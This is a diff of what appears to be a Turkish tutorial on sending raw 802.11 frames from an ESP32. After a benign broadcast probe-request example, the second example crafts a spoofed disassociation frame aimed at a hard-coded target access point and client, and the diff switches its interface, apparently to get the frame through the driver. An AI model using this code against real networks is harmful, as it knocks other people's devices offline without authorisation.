@@ -13,8 +13,12 @@ esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, b
 Basit bir kullanım örneği şöyle olabilir:
 ```c
 #include <string.h>
+
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+
+#include "esp_err.h"
+#include "esp_netif.h"
 #include "esp_wifi.h"
 #include "esp_event.h"
 #include "esp_log.h"
@@ -22,74 +26,89 @@ Basit bir kullanım örneği şöyle olabilir:
 
 #define TAG "RAW_TX_EXAMPLE"
 
-void send_raw_probe_request(void)
+void send_broadcast_probe_request(void)
 {
-    // Örnek bir 802.11 Probe Request çerçevesi oluşturalım.
-    // Gerçek bir pakette MAC başlığı kurallarına tam uyulmalıdır (Frame Control, Duration, Addr1, Addr2, Addr3, Sequence Control).
-    uint8_t packet[128];
-    memset(packet, 0, sizeof(packet));
+    uint8_t packet[29] = {0};
 
-    // 1. Frame Control (2 bytes): 0x0040 -> Management Frame, Subtype: Probe Request
-    packet[0] = 0x40; 
+    // Frame Control: Probe Request
+    packet[0] = 0x40;
     packet[1] = 0x00;
-    
-    // 2. Duration (2 bytes): 0x0000
+
+    // Duration
     packet[2] = 0x00;
     packet[3] = 0x00;
-    
-    // 3. Address 1 - Destination MAC (Broadcast: ff:ff:ff:ff:ff:ff) (6 bytes)
+
+    // Destination: Broadcast
     memset(&packet[4], 0xFF, 6);
-    
-    // 4. Address 2 - Source MAC (ESP32'nin veya sahte bir MAC adresi) (6 bytes)
-    uint8_t src_mac[6] = {0x24, 0x0A, 0xC4, 0x11, 0x22, 0x33};
+
+    // Source MAC
+    uint8_t src_mac[6] = {
+        0x24, 0x0A, 0xC4, 0x11, 0x22, 0x33
+    };
     memcpy(&packet[10], src_mac, 6);
-    
-    // 5. Address 3 - BSSID (Broadcast) (6 bytes)
+
+    // BSSID: Broadcast
     memset(&packet[16], 0xFF, 6);
-    
-    // 6. Sequence Control (2 bytes) -> en_sys_seq = true olduğu için burayı 0 bırakabiliriz, sürücü dolduracaktır.
+
+    // Sequence Control
     packet[22] = 0x00;
     packet[23] = 0x00;
 
-    int packet_len = 24;
+    // Wildcard SSID IE
+    packet[24] = 0x00;
+    packet[25] = 0x00;
 
-    // Paketi STA arayüzü üzerinden gönder
-    // en_sys_seq = true -> Sequence kontrolünü Wi-Fi donanımı/sürücüsü yönetir.
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, packet_len, true);
-    
+    // Supported Rates IE: 1 Mbps
+    packet[26] = 0x01;
+    packet[27] = 0x01;
+    packet[28] = 0x82;
+
+    // Transmit via STA interface
+    esp_err_t err = esp_wifi_80211_tx(
+        WIFI_IF_STA, packet, sizeof(packet), true
+    );
+
     if (err == ESP_OK) {
-        ESP_LOGI(TAG, "802.11 ham paketi başarıyla iletildi.");
+        ESP_LOGI(TAG, "Broadcast Probe Request sent");
     } else {
-        ESP_LOGE(TAG, "Paket gönderilemedi! Hata: %s", esp_err_to_name(err));
+        ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(err));
     }
 }
 
 void app_main(void)
 {
-    // NVS Flash'ı başlat (Wi-Fi sürücüsü için gereklidir)
+    // Initialize NVS
     esp_err_t ret = nvs_flash_init();
-    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+
+    if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
+        ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
         ret = nvs_flash_init();
     }
+
     ESP_ERROR_CHECK(ret);
 
-    // Ağ arayüzünü ve Wi-Fi'ı başlat
+    // Initialize network stack
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
-    
+
+    // Initialize Wi-Fi
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
 
-    // Wi-Fi modunu STA olarak ayarla ve başlat
+    // Start STA mode
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
 
-    // Paket göndermeden önce hedef Wi-Fi kanalını ayarlamak gerekebilir (Örn: Kanal 6)
-    ESP_ERROR_CHECK(esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE));
+    // Set Wi-Fi channel
+    ESP_ERROR_CHECK(
+        esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE)
+    );
 
-    vTaskDelay(pdMS_TO_TICKS(1000));
-    send_raw_probe_request();
+    vTaskDelay(pdMS_TO_TICKS(500));
+
+    // Send Probe Request
+    send_broadcast_probe_request();
 }
 ```
 Yukardaki kodda Broadcast Probe Request örneği görüyorsunuz. Bu frame i algılayan tüm AP(Access Point) ler bize Probe Response gönderecektir. Ama biz bunla şimdilik ilgilenmiyoruz. Esas ilgimizi çeken "esp_wifi_80211_tx" fonksiyonu. Bu fonksiyon bu senaryoda kendisinden beklenen işlemi harfiyen yerine getirecek ve wifi frame ini driver a iletecektir. Ama bu her zaman bu kadar kolay olmayacak. İkinci örneğimize geçelim.  
@@ -108,7 +127,7 @@ Yukardaki kodda Broadcast Probe Request örneği görüyorsunuz. Bu frame i alg�
 
 #define WIFI_CHANNEL 8
 
-// Hedef Bilgileri
+// Hedef Bilgileri, rastgele, yada değil:D, önemi var mı, bence yok
 static const uint8_t target_bssid[6] = { 0x38, 0x16, 0x5A, 0x32, 0x11, 0x70 };
 static const uint8_t target_device[6] = { 0x4A, 0x06, 0x04, 0xF4, 0xA0, 0x79 };
 
@@ -127,7 +146,7 @@ void send_single_disassoc(void)
         0x08, 0x00             // Reason Code 8
     };
 
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), true);
     if (err == ESP_OK) {
         printf("Disassoc Gonderildi!\n");
     } else {
@@ -137,7 +156,6 @@ void send_single_disassoc(void)
 
 void app_main(void)
 {
-    // Temel sistem ve Wi-Fi başlatma adımları
     ESP_ERROR_CHECK(nvs_flash_init());
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
@@ -145,13 +163,12 @@ void app_main(void)
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
     
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
     ESP_ERROR_CHECK(esp_wifi_set_channel(WIFI_CHANNEL, WIFI_SECOND_CHAN_NONE));
 
     printf("Wi-Fi baslatildi. Disassoc paketi gonderiliyor...\n");
 
-    // Wi-Fi sürücüsünün oturması için kısa bir gecikme
     vTaskDelay(pdMS_TO_TICKS(500));
 
     send_single_disassoc();
